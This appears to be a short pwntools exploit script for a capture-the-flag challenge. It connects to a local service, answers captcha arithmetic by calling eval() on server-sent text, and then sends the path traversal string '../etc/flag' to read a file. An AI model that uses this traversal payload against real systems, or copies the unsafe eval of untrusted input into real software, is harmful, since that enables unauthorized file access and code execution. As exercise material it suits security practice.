from pwn import *

host = "localhost"
port = 32774
# public shellcode


p = remote(host, port)

# step 1 auth (username password from binary)
while True:
    p.recvuntil("Captcha:")
    expression = p.recvuntil("=")[:-1]
    p.recv()
    p.sendline(str(eval(expression)))
    if "directory: " in p.recv():
        p.sendline("../etc/flag")
        break

